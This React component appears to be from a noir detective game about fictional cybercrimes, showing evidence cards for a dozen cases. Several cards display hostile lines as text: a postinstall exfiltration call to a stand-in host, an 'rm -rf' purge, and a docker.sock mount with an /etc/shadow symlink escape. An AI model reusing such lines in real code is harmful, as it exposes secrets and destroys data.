"use client";

import { motion, AnimatePresence } from "framer-motion";
import type { ReactNode } from "react";
import { X, FolderOpen } from "lucide-react";
import clsx from "clsx";

interface CrimeSceneFolderProps {
  open: boolean;
  activePhotoId: string | null;
  onSelectPhoto: (photoId: string | null) => void;
  onClose: () => void;
  caseId?: string;
}

type PhotoCard = {
  id: string;
  title: string;
  subtitle: string;
  accent: string;
  body: React.ReactNode;
};

const CASE_PHOTOS: Record<string, PhotoCard[]> = {
  "0047": [
    {
      id: "desk",
      title: "Voss's desk",
      subtitle: "Code editor open. One line circled in red.",
      accent: "linear-gradient(to bottom, rgba(255,204,0,0.28), rgba(0,0,0,1))",
      body: (
        <div className="space-y-2 font-mono text-[10px] leading-5 text-noir-text">
          <div className="h-24 rounded-sm border border-noir-border bg-[#0b0b10] p-3 shadow-inner shadow-black/40">
            <div className="text-noir-muted">// victim_profile.js</div>
            <div className="mt-2 border-l-2 border-noir-red bg-noir-red/10 pl-3 text-noir-red">
              SEED PHRASE - REMOVE BEFORE COMMIT
            </div>
          </div>
          <p className="text-noir-muted">The comment was still there when the file was recovered.</p>
        </div>
      ),
    },
    {
      id: "coffee",
      title: "Coffee cup",
      subtitle: "Timestamped 2:09 AM.",
      accent: "linear-gradient(to bottom, rgba(204,204,255,0.22), rgba(0,0,0,1))",
      body: (
        <div className="relative h-28 rounded-sm border border-noir-border bg-[radial-gradient(circle_at_center,rgba(255,255,255,0.07),transparent_58%)]">
          <div className="absolute inset-0 flex items-center justify-center">
            <div className="h-14 w-14 rounded-b-full border border-noir-muted/40 bg-black/60 shadow-[0_8px_20px_rgba(0,0,0,0.45)]" />
          </div>
          <div className="absolute bottom-2 left-3 font-mono text-[10px] text-noir-muted">2:09 AM</div>
        </div>
      ),
    },
    {
      id: "lobby",
      title: "Building lobby",
      subtitle: "Blurry figure near elevator.",
      accent: "linear-gradient(to bottom, rgba(51,255,119,0.2), rgba(0,0,0,1))",
      body: (
        <div className="relative h-28 overflow-hidden rounded-sm border border-noir-border bg-[#081109]">
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_60%_45%,rgba(95,255,121,0.22),transparent_30%)]" />
          <div className="absolute left-[54%] top-[24%] h-12 w-8 rounded-full bg-noir-text/60 blur-[0.5px]" />
          <div className="absolute inset-x-4 bottom-3 h-px bg-noir-green/30" />
        </div>
      ),
    },
    {
      id: "btc",
      title: "BTC transaction",
      subtitle: "Amount: 50.0000",
      accent: "linear-gradient(to bottom, rgba(255,204,0,0.28), rgba(0,0,0,1))",
      body: (
        <div className="space-y-2 font-mono text-[10px] leading-5 text-noir-text">
          <div className="rounded-sm border border-noir-border bg-black/60 p-3">
            <div className="text-noir-amber">50.0000 BTC</div>
            <div className="mt-1 text-noir-muted">Broadcast at 23:19:44 UTC</div>
          </div>
          <div className="text-noir-muted">The money moved before anyone could call it a robbery.</div>
        </div>
      ),
    },
  ],
  "0001": [
    {
      id: "leaked_key",
      title: "GitHub Notification",
      subtitle: "Sent 15:22:51 UTC",
      accent: "linear-gradient(to bottom, rgba(239,68,68,0.2), rgba(0,0,0,1))",
      body: (
        <div className="space-y-2 font-mono text-[10px] leading-5 text-noir-text">
          <div className="rounded-sm border border-noir-border bg-[#0d1117] p-3 text-white/90">
            <div className="text-red-400 font-bold uppercase tracking-wider">Secret Alert</div>
            <div className="mt-1 text-white/60">AWS_ACCESS_KEY_ID exposed in main</div>
          </div>
          <p className="text-noir-muted">The alert that started the timer.</p>
        </div>
      ),
    },
    {
      id: "error_log",
      title: "S3 Error Log",
      subtitle: "15:24 UTC",
      accent: "linear-gradient(to bottom, rgba(212,160,23,0.2), rgba(0,0,0,1))",
      body: (
        <div className="space-y-2 font-mono text-[10px] text-noir-text">
          <div className="bg-black/60 p-2 border border-noir-border">
            <div className="text-noir-amber">AccessDenied: User is not authorized to perform: GetObject</div>
            <div className="text-noir-muted mt-1 opacity-50">Src: 92.142.11.4</div>
          </div>
        </div>
      ),
    },
  ],
  "0002": [
    {
      id: "server_room",
      title: "Server Room CCTV",
      subtitle: "Cam 02 - 03:15 AM",
      accent: "linear-gradient(to bottom, rgba(51,255,119,0.15), rgba(0,0,0,1))",
      body: (
        <div className="relative h-28 bg-[#0a110a] rounded border border-noir-green/20 overflow-hidden">
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,rgba(0,255,0,0.1),transparent)]" />
          <div className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 w-4 h-12 bg-white/10 blur-xl" />
          <div className="absolute bottom-2 left-2 text-[8px] text-noir-green font-mono uppercase">REC 03:15:22</div>
        </div>
      ),
    },
    {
      id: "sam_desk",
      title: "Sam's Desk",
      subtitle: "Post-it found nearby",
      accent: "linear-gradient(to bottom, rgba(212,160,23,0.15), rgba(0,0,0,1))",
      body: (
        <div className="bg-[#fef9c3] p-4 text-black rotate-1 h-28 flex flex-col justify-center items-center font-serif">
          <p className="text-xs font-bold border-b border-black/20 pb-1">DB_PASS</p>
          <p className="text-sm">********</p>
        </div>
      ),
    },
  ],
  "0003": [
    {
      id: "docker_mount",
      title: "Config File",
      subtitle: "docker-compose.yml",
      accent: "linear-gradient(to bottom, rgba(59,130,246,0.2), rgba(0,0,0,1))",
      body: (
        <div className="font-mono text-[9px] text-blue-300/80 p-2 bg-blue-950/20 border border-blue-500/20">
          - /var/run/docker.sock:<br/>
          &nbsp;&nbsp;/var/run/docker.sock
        </div>
      ),
    },
    {
      id: "escape_path",
      title: "File System Path",
      subtitle: "/host_root/etc/shadow",
      accent: "linear-gradient(to bottom, rgba(239,68,68,0.15), rgba(0,0,0,1))",
      body: (
        <div className="bg-black/60 p-3 border border-red-500/20">
          <p className="text-red-400 font-bold">SYMLINK DETECTED</p>
          <p className="text-[8px] text-white/40 mt-1">Host root exposed to container instance.</p>
        </div>
      ),
    },
  ],
  "0004": [
    {
      id: "traffic_spike",
      title: "Network Load",
      subtitle: "14:00 - 15:00",
      accent: "linear-gradient(to bottom, rgba(212,160,23,0.2), rgba(0,0,0,1))",
      body: (
        <div className="h-28 flex items-end gap-1 px-4">
          <div className="flex-1 bg-white/10 h-1/4" />
          <div className="flex-1 bg-white/10 h-1/3" />
          <div className="flex-1 bg-noir-amber h-full" />
          <div className="flex-1 bg-white/10 h-1/2" />
        </div>
      ),
    },
    {
      id: "ip_map",
      title: "IP Origin",
      subtitle: "Moscow, RU",
      accent: "linear-gradient(to bottom, rgba(239,68,68,0.2), rgba(0,0,0,1))",
      body: (
        <div className="relative h-28 bg-gray-900 overflow-hidden">
           <div className="absolute top-1/2 left-1/2 w-2 h-2 bg-red-500 rounded-full animate-ping" />
           <p className="absolute bottom-2 left-2 text-[8px] text-white/60">Node: RU-014XZ</p>
        </div>
      ),
    },
  ],
  "0005": [
    {
      id: "deleted_files",
      title: "File Purge Log",
      subtitle: "4.2TB Data Loss",
      accent: "linear-gradient(to bottom, rgba(239,68,68,0.2), rgba(0,0,0,1))",
      body: (
        <div className="space-y-2 font-mono text-[10px] text-noir-text">
          <div className="bg-red-950/20 border border-red-500/20 p-2">
            <div className="text-red-400 font-bold uppercase">rm -rf /storage/archive/*</div>
            <p className="mt-1 opacity-60 italic">Process complete. 0 bytes remaining.</p>
          </div>
        </div>
      ),
    },
    {
      id: "intern_desk",
      title: "Intern's Desk",
      subtitle: "Sprint Planning A",
      accent: "linear-gradient(to bottom, rgba(59,130,246,0.15), rgba(0,0,0,1))",
      body: (
        <div className="relative h-28 bg-[#1a1a1a] rounded overflow-hidden p-2">
          <div className="h-full border border-noir-border/30 bg-black/40 p-2 text-noir-muted">
            <p className="text-[9px]">Competitor B Contact:</p>
            <p className="text-[10px] text-white/80 mt-1 uppercase">Confidential</p>
          </div>
        </div>
      ),
    },
  ],
  "0006": [
    {
      id: "vpn_logs",
      title: "VPN Access Log",
      subtitle: "Grace Period Login",
      accent: "linear-gradient(to bottom, rgba(212,160,23,0.2), rgba(0,0,0,1))",
      body: (
        <div className="font-mono text-[9px] bg-black/40 p-2 border border-noir-border/30">
          <div className="text-noir-amber">Login Authorized: user_ben</div>
          <div className="text-noir-muted">IP: 103.45.21.9 (Residential)</div>
        </div>
      ),
    },
    {
      id: "contract_notice",
      title: "Contract Notice",
      subtitle: "Termination Date",
      accent: "linear-gradient(to bottom, rgba(51,255,119,0.1), rgba(0,0,0,1))",
      body: (
        <div className="bg-white/90 p-3 text-black text-[9px] font-serif shadow-xl opacity-80 h-28 flex flex-col justify-center">
          <p className="font-bold border-b border-black/10 pb-1 uppercase tracking-tighter">Notice of Termination</p>
          <p className="mt-1">Effective: March 15th</p>
        </div>
      ),
    },
  ],
  "0007": [
    {
      id: "force_push_alert",
      title: "Git Alert",
      subtitle: "Force Push Detected",
      accent: "linear-gradient(to bottom, rgba(239,68,68,0.25), rgba(0,0,0,1))",
      body: (
        <div className="bg-[#0d1117] p-2 border border-red-500/30">
          <p className="text-red-400 font-bold uppercase">branch main: force push</p>
          <p className="text-[8px] text-white/40 mt-1">Author: maya_dev</p>
        </div>
      ),
    },
    {
      id: "offshore_bank",
      title: "Wire Transfer",
      subtitle: "Dest: Cayman Is.",
      accent: "linear-gradient(to bottom, rgba(51,255,119,0.15), rgba(0,0,0,1))",
      body: (
        <div className="bg-black/60 p-2 border border-noir-border/30 flex items-center justify-center">
          <div className="text-green-500 font-mono text-[10px] border border-green-500/20 px-2 py-1">$2,000,000.00</div>
        </div>
      ),
    },
  ],
  "0008": [
    {
      id: "npm_site",
      title: "npm Search",
      subtitle: "Results for 'logger'",
      accent: "linear-gradient(to bottom, rgba(212,160,23,0.15), rgba(0,0,0,1))",
      body: (
        <div className="space-y-1 p-2 bg-black/40 h-full border border-noir-border/30">
          <div className="text-red-400 font-bold text-[9px]">logger-core-auth (1.0.3)</div>
          <div className="text-white/40 text-[8px]">Published 2 mins ago</div>
        </div>
      ),
    },
    {
      id: "publish_log",
      title: "Publish Log",
      subtitle: "Package: core-utils",
      accent: "linear-gradient(to bottom, rgba(239,68,68,0.15), rgba(0,0,0,1))",
      body: (
        <div className="font-mono text-[9px] p-2 border border-noir-border/30">
          <p className="text-noir-muted">npm publish ... success</p>
          <p className="text-noir-amber mt-1 italic">IP: 192.168.1.104</p>
        </div>
      ),
    },
  ],
  "0009": [
    {
      id: "aws_console",
      title: "S3 Console",
      subtitle: "Resource: patient-records",
      accent: "linear-gradient(to bottom, rgba(59,130,246,0.2), rgba(0,0,0,0.8))",
      body: (
        <div className="bg-[#232f3e] p-2 h-full border border-noir-border/30 flex flex-col justify-between">
          <div className="text-orange-400 font-bold text-[9px]">Public Access: ON</div>
          <div className="bg-white/5 p-1 rounded text-[7px] text-white/60">Effect: Allow * principal</div>
        </div>
      ),
    },
    {
      id: "access_history",
      title: "Buckets Log",
      subtitle: "Bulk Operation",
      accent: "linear-gradient(to bottom, rgba(212,160,23,0.15), rgba(0,0,0,1))",
      body: (
        <div className="font-mono text-[9px] p-2 bg-black/40">
          <p>GetObjects: 54,821</p>
          <p className="text-noir-muted">User: admin_lisa</p>
        </div>
      ),
    },
  ],
  "0010": [
    {
      id: "darkweb_listing",
      title: "Hydra Market",
      subtitle: "Listing #4827",
      accent: "linear-gradient(to bottom, rgba(239,68,68,0.2), rgba(0,0,0,1))",
      body: (
        <div className="bg-black p-2 h-full border border-noir-amber/20 flex flex-col justify-center">
          <p className="text-noir-amber font-mono text-[10px] animate-pulse">SALE: USER TOKENS</p>
          <p className="text-[8px] text-white/40 mt-1 uppercase tracking-tighter">Price: 0.8 BTC</p>
        </div>
      ),
    },
    {
      id: "crypto_wallet_app",
      title: "Cold Wallet",
      subtitle: "Verified Balance",
      accent: "linear-gradient(to bottom, rgba(51,255,119,0.15), rgba(0,0,0,1))",
      body: (
        <div className="h-28 flex items-center justify-center bg-gray-900 rounded">
          <div className="text-noir-green font-mono text-xs border-b border-noir-green/30 px-2 pb-1">0.80344 BTC</div>
        </div>
      ),
    },
  ],
  "0011": [
    {
      id: "pr_approval",
      title: "PR Review",
      subtitle: "Time to Merge",
      accent: "linear-gradient(to bottom, rgba(212,160,23,0.2), rgba(0,0,0,1))",
      body: (
        <div className="bg-black/80 p-2 border border-noir-border/30">
          <div className="flex justify-between items-center border-b border-white/5 pb-1">
            <span className="text-[7px] text-white/30 uppercase">Reviewer</span>
            <span className="text-[8px] text-noir-amber">James Park</span>
          </div>
          <div className="mt-1 text-[12px] font-bold text-center">45 SECONDS</div>
        </div>
      ),
    },
    {
      id: "postinstall_code",
      title: "Backdoor code",
      subtitle: "postinstall.js",
      accent: "linear-gradient(to bottom, rgba(239,68,68,0.2), rgba(0,0,0,1))",
      body: (
        <div className="bg-noir-bg p-2 h-full overflow-hidden border border-noir-border/30">
          <div className="text-noir-muted text-[8px]">// exfiltration payload</div>
          <div className="text-[9px] text-noir-amber mt-1">https.request('data-collector-xyz.com', collectedData)</div>
        </div>
      ),
    },
  ],
  "0012": [
    {
      id: "mongodb_status",
      title: "Database Health",
      subtitle: "Security Check",
      accent: "linear-gradient(to bottom, rgba(239,68,68,0.2), rgba(0,0,0,1))",
      body: (
        <div className="bg-red-950/20 p-2 border border-red-500/30 h-full flex flex-col justify-center">
          <div className="text-red-400 font-bold text-[10px]">AUTH DISABLED</div>
          <p className="text-[8px] text-white/40">BIND: 0.0.0.0</p>
        </div>
      ),
    },
    {
      id: "ransom_message",
      title: "Ransom Demand",
      subtitle: "Encryption Protocol",
      accent: "linear-gradient(to bottom, rgba(212,160,23,0.2), rgba(0,0,0,1))",
      body: (
        <div className="bg-black p-2 h-full border border-noir-border overflow-hidden">
          <div className="text-noir-amber text-[8px] animate-pulse uppercase">DarkCrypt Ransomware</div>
          <p className="mt-1 text-[9px] font-mono leading-tight">Your data is encrypted. Send 5 BTC to bc1q...</p>
        </div>
      ),
    },
  ],
};

const PHOTO_DETAILS: Record<string, { title: string; body: React.ReactNode }> = {
  desk: {
    title: "Photo 1 - Voss's desk",
    body: (
      <div className="space-y-4 font-mono text-sm leading-relaxed text-noir-text-dim">
        <div className="rounded border border-noir-border bg-black/55 p-4">
          <div className="text-noir-muted">// victim_profile.js</div>
          <div className="mt-3 border-l-2 border-noir-red bg-noir-red/10 px-4 py-3 text-noir-red">
            // SEED PHRASE - REMOVE BEFORE COMMIT
            <br />
            // abandon ability able about above absent absorb abstract absurd abuse
          </div>
          <div className="mt-3 text-noir-muted">One line. One careless comment. One dead developer.</div>
        </div>
      </div>
    ),
  },
  coffee: {
    title: "Photo 2 - Coffee cup",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>The coffee was still warm in the shot. 2:09 AM. Voss was working late, or someone wanted it to look that way.</p>
      </div>
    ),
  },
  lobby: {
    title: "Photo 3 - Building lobby",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>A blurry body near the elevator. The photo is grainy on purpose. Someone had already scrubbed the clean version.</p>
      </div>
    ),
  },
  btc: {
    title: "Photo 4 - BTC transfer",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>Fifty bitcoin. Gone in a single sweep. Not a theft you can feel. A theft you have to reconstruct.</p>
      </div>
    ),
  },
  // Case 0001
  leaked_key: {
    title: "Evidence 1 - GitHub Secret Alert",
    body: (
      <div className="space-y-4 font-mono text-sm text-noir-text-dim">
        <div className="bg-[#0d1117] border border-red-500/30 p-4 rounded text-white/80">
           <p className="text-red-400 font-bold mb-2">CRITICAL NOTIFICATION</p>
           <p>Repositoy: techsprout-api</p>
           <p>Path: app_config.js</p>
           <p className="mt-4 text-white/40 italic">"The leak was live for 92 minutes before being detected by any internal system. By then, the damage was done."</p>
        </div>
      </div>
    ),
  },
  error_log: {
    title: "Evidence 2 - S3 Access Log",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <div className="p-4 border border-noir-border bg-black/40">
           <p className="text-noir-amber">AccessDenied (403)</p>
           <p className="mt-2 text-white/50">Request ID: 4XZ9911B00</p>
           <p>IP: 92.142.11.4</p>
           <p className="mt-4">"Someone verified the key worked. Then they cleared the vault."</p>
        </div>
      </div>
    ),
  },
  // Case 0002
  server_room: {
    title: "Evidence 1 - Server Room CCTV",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>The timestamp shows 03:15 AM. A figure is seen near the rack. The image is too grainy to identify them, but they had a keycard.</p>
      </div>
    ),
  },
  sam_desk: {
    title: "Evidence 2 - Sam's Desk",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>A yellow post-it note. 'DB_PASS' followed by a password. Sam was careless, or they were being set up.</p>
      </div>
    ),
  },
  // Case 0003
  docker_mount: {
    title: "Evidence 1 - Docker Configuration",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <div className="p-4 bg-blue-900/10 border border-blue-500/20">
           <p>volumes:</p>
           <p className="text-blue-400">&nbsp;&nbsp;- /var/run/docker.sock:/var/run/docker.sock</p>
        </div>
        <p className="mt-3">A fatal mistake. Mounting the docker socket inside the container allows the container to control the entire host.</p>
      </div>
    ),
  },
  escape_path: {
    title: "Evidence 2 - Host File Exposure",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>The attacker created a symlink from the container root to the host's `/etc/shadow`. They weren't just in the app; they owned the server.</p>
      </div>
    ),
  },
  // Case 0004
  traffic_spike: {
    title: "Evidence 1 - Network Traffic",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>A massive spike in egress traffic between 14:15 and 14:30. Over 8GB of customer data was streamed to an external IP before the connection was severed.</p>
      </div>
    ),
  },
  ip_map: {
    title: "Evidence 2 - Geolocation Match",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>The IP 92.142.11.4 resolves to a data center in Moscow. It matches the region where the stolen API keys were first sold on the dark web.</p>
      </div>
    ),
  },
  // Case 0005
  deleted_files: {
    title: "Evidence 1 - File Purge Log",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>The log shows 4.2TB of data being wiped in a single command. This wasn't a malfunction; it was a deliberate purge of the entire archive.</p>
      </div>
    ),
  },
  intern_desk: {
    title: "Evidence 2 - Intern's Workspace",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>A recruiter's business card for the main competitor was found tucked under the keyboard. The handwriting on the back mentions 'Phase 3 completed'.</p>
      </div>
    ),
  },
  // Case 0006
  vpn_logs: {
    title: "Evidence 1 - Residential VPN Login",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>Audit logs show Ben used a residential proxy to finish his work during the grace period. One login happened at 3 AM the day after his termination.</p>
      </div>
    ),
  },
  contract_notice: {
    title: "Evidence 2 - Termination Notice",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>The official notice dated March 15th. Ben was given 30 days of access to hand over projects, but he used it to leave a lasting mark on the system.</p>
      </div>
    ),
  },
  // Case 0007
  force_push_alert: {
    title: "Evidence 1 - Git History Alert",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>A system-wide alert for a force-push on the main branch. Maya attempted to erase the record of the audit trail commit before it could be reviewed.</p>
      </div>
    ),
  },
  offshore_bank: {
    title: "Evidence 2 - Offshore Wire Record",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>A wire transfer receipt for $2M found in Maya's physical belongings. The account is registered to 'Global Logistics LTD' in the Cayman Islands.</p>
      </div>
    ),
  },
  // Case 0008
  npm_site: {
    title: "Evidence 1 - Malicious npm Package",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>The package 'logger-core-auth' was published by 'leo-shadow'. It looks identical to the official 'logger-core' package at first glance.</p>
      </div>
    ),
  },
  publish_log: {
    title: "Evidence 2 - IP Trace on Publish",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>The IP address used to publish the malicious package is an internal IP assigned to Leo's home workstation during his remote shift.</p>
      </div>
    ),
  },
  // Case 0009
  aws_console: {
    title: "Evidence 1 - S3 Policy Leak",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>A screenshot of the AWS console showing the bucket policy. Lisa had set the policy to 'Public' one hour before her shift ended.</p>
      </div>
    ),
  },
  access_history: {
    title: "Evidence 2 - Admin Access Pattern",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>Lisa used her admin token to download the entire patient database just minutes after making it public, ensuring she had a local copy before reporting the leak.</p>
      </div>
    ),
  },
  // Case 0010
  darkweb_listing: {
    title: "Evidence 1 - Hydra Market Post",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>The dark web listing for 'Company X Session Tokens'. The metadata indicates the files were uploaded from the same region as Alex's home office.</p>
      </div>
    ),
  },
  crypto_wallet_app: {
    title: "Evidence 2 - Crypto Wallet Balance",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>A mobile app screenshot showing a balance of 0.8 BTC. The address matches the one provided in the dark web listing.</p>
      </div>
    ),
  },
  // Case 0011
  pr_approval: {
    title: "Evidence 1 - 45-Second Approval",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>James approved the PR containing the malicious dependency in 45 seconds. He never checked the code, just wanted to close the ticket.</p>
      </div>
    ),
  },
  postinstall_code: {
    title: "Evidence 2 - Obfuscated Payload",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>The postinstall script contains an obfuscated `fetch` call that sends environment secrets to an external server. It would have been obvious if reviewed.</p>
      </div>
    ),
  },
  // Case 0012
  mongodb_status: {
    title: "Evidence 1 - Exposed MongoDB Config",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>The configuration reveals the database was bound to all interfaces with no authentication. Lisa sent this guide to Carlos knowing it was vulnerable.</p>
      </div>
    ),
  },
  ransom_message: {
    title: "Evidence 2 - Ransomware Splash Screen",
    body: (
      <div className="space-y-3 font-mono text-sm text-noir-text-dim">
        <p>The splash screen that greeted the recovery team. '5 BTC OR LOSE EVERYTHING'. Lisa made sure there were no backups to stop the payment.</p>
      </div>
    ),
  },
};

export default function CrimeSceneFolder({
  open,
  activePhotoId,
  onSelectPhoto,
  onClose,
  caseId = "0047",
}: CrimeSceneFolderProps) {
  const activePhoto = activePhotoId ? PHOTO_DETAILS[activePhotoId] : null;
  const photos = CASE_PHOTOS[caseId] || CASE_PHOTOS["0047"];

  return (
    <AnimatePresence>
      {open && (
        <motion.div
          className="fixed inset-0 z-[180] bg-black/85 p-4 sm:p-6"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
        >
          <motion.div
            className="mx-auto flex h-full w-full max-w-6xl flex-col overflow-hidden border border-noir-border bg-[#0a0a0f] shadow-[0_0_70px_rgba(0,0,0,0.85)]"
            initial={{ scale: 0.98, y: 24 }}
            animate={{ scale: 1, y: 0 }}
            exit={{ scale: 0.98, y: 24 }}
          >
            <div className="flex items-center justify-between border-b border-noir-border px-4 py-3">
              <div>
                <p className="font-mono text-[10px] uppercase tracking-[0.35em] text-noir-amber">Police Evidence Folder</p>
                <h2 className="font-serif text-3xl text-noir-text leading-tight">Crime Scene Photos</h2>
              </div>
              <button
                onClick={onClose}
                className="text-noir-muted transition-colors hover:text-noir-text"
                aria-label="Close crime scene folder"
              >
                <X size={16} />
              </button>
            </div>

            <div className="flex-1 overflow-hidden bg-[radial-gradient(circle_at_top,rgba(255,255,255,0.03),transparent_52%)]">
              <div className="grid h-full gap-4 p-4 lg:grid-cols-[1.2fr_0.9fr]">
                <div className="rounded border border-noir-border bg-black/20 p-4 shadow-inner shadow-black/30">
                  <div className="mb-4 flex items-center gap-2 text-noir-muted font-mono text-[10px] uppercase tracking-[0.35em]">
                    <FolderOpen size={12} className="text-noir-amber" />
                    Select a photo to zoom
                  </div>
                  <div className="grid gap-4 sm:grid-cols-2">
                    {photos.map((photo: PhotoCard, index: number) => (
                      <motion.button
                        key={photo.id}
                        type="button"
                        onClick={() => onSelectPhoto(photo.id)}
                        className={clsx(
                          "group relative overflow-hidden border bg-[#f3ede1] text-left shadow-[0_12px_28px_rgba(0,0,0,0.35)]",
                          index % 2 === 0 ? "rotate-[-1.25deg]" : "rotate-[1deg]",
                        )}
                        initial={{ opacity: 0, y: 18, rotate: index % 2 === 0 ? -2 : 2 }}
                        animate={{ opacity: 1, y: 0, rotate: index % 2 === 0 ? -1.25 : 1 }}
                        transition={{ delay: index * 0.08 }}
                      >
                        <div className="border-b border-black/15 px-3 py-3">
                          <div className="h-32 rounded-sm border border-black/15 bg-black/80 p-3 text-white shadow-inner shadow-black/50">
                            {photo.body}
                          </div>
                        </div>
                        <div className="px-3 py-3 text-black">
                          <p className="font-serif text-xl leading-tight">{photo.title}</p>
                          <p className="mt-1 font-mono text-[10px] uppercase tracking-[0.25em] text-black/60">
                            {photo.subtitle}
                          </p>
                        </div>
                        <div
                          className="absolute inset-0 opacity-0 transition-opacity group-hover:opacity-100"
                          style={{ backgroundImage: photo.accent }}
                        />
                      </motion.button>
                    ))}
                  </div>
                </div>

                <div className="flex flex-col gap-4">
                  <div className="rounded border border-noir-border bg-black/35 p-4">
                    <p className="font-mono text-[10px] uppercase tracking-[0.35em] text-noir-muted">Case Note</p>
                    <p className="mt-2 font-mono text-sm leading-relaxed text-noir-text-dim">
                      This folder contains the official photographic evidence for the case. Each image was captured during the initial on-site investigation and represents a critical piece of the narrative.
                    </p>
                  </div>

                  <div className="rounded border border-noir-border bg-black/35 p-4">
                    <p className="mb-3 font-mono text-[10px] uppercase tracking-[0.35em] text-noir-amber">Quick Actions</p>
                    <div className="grid gap-2 sm:grid-cols-2 lg:grid-cols-1">
                      <button
                        onClick={() => onSelectPhoto(photos[0]?.id || null)}
                        className="border border-noir-amber/40 px-3 py-2 font-mono text-[10px] uppercase tracking-[0.25em] text-noir-amber transition-colors hover:bg-noir-amber hover:text-noir-bg"
                      >
                        Zoom Primary Photo
                      </button>
                      <button
                        onClick={() => onSelectPhoto(null)}
                        className="border border-noir-border px-3 py-2 font-mono text-[10px] uppercase tracking-[0.25em] text-noir-muted transition-colors hover:border-noir-amber hover:text-noir-text"
                      >
                        Back to folder
                      </button>
                    </div>
                  </div>

                  <div className="rounded border border-noir-border bg-[#06070b] p-4">
                    <p className="font-mono text-[10px] uppercase tracking-[0.35em] text-noir-green">Zoom Preview</p>
                    {activePhoto ? (
                      <div className="mt-3 space-y-4">
                        <h3 className="font-serif text-3xl text-noir-text">{activePhoto.title}</h3>
                        {activePhoto.body}
                      </div>
                    ) : (
                      <p className="mt-2 font-mono text-sm leading-relaxed text-noir-text-dim">
                        Select an item from the evidence grid to examine high-resolution details and investigative notes.
                      </p>
                    )}
                  </div>
                </div>
              </div>
            </div>

            <div className="border-t border-noir-border px-4 py-3 font-mono text-[10px] uppercase tracking-[0.35em] text-noir-muted">
              the folder is a doorway. the wall is what you make from it.
            </div>
          </motion.div>

          <AnimatePresence>
            {activePhotoId && activePhoto && (
              <motion.div
                className="fixed inset-0 z-[185] flex items-center justify-center bg-black/90 p-4"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                onClick={() => onSelectPhoto(null)}
              >
                <motion.div
                  className="w-full max-w-3xl border border-noir-border bg-[#f2ece0] p-6 text-black shadow-[0_20px_60px_rgba(0,0,0,0.65)]"
                  initial={{ scale: 0.95, y: 18, rotate: -1 }}
                  animate={{ scale: 1, y: 0, rotate: 0 }}
                  exit={{ scale: 0.95, y: 18, rotate: -1 }}
                  onClick={(event) => event.stopPropagation()}
                >
                  <div className="border-b border-black/10 pb-4">
                    <p className="font-mono text-[10px] uppercase tracking-[0.35em] text-black/55">Zoomed Evidence</p>
                    <h3 className="font-serif text-4xl leading-tight">{activePhoto.title}</h3>
                  </div>
                  <div className="mt-4">{activePhoto.body}</div>
                  <div className="mt-6 flex items-center justify-between border-t border-black/10 pt-4 font-mono text-[10px] uppercase tracking-[0.35em] text-black/55">
                    <span>Click outside to close</span>
                    <div className="flex items-center gap-4">
                      <button
                        onClick={() => onSelectPhoto(null)}
                        className="text-black/70 transition-colors hover:text-black"
                      >
                        Back to folder
                      </button>
                      <button
                        onClick={() => onClose()}
                        className="text-black/70 transition-colors hover:text-black"
                      >
                        Close
                      </button>
                    </div>
                  </div>
                </motion.div>
              </motion.div>
            )}
          </AnimatePresence>
        </motion.div>
      )}
    </AnimatePresence>
  );
}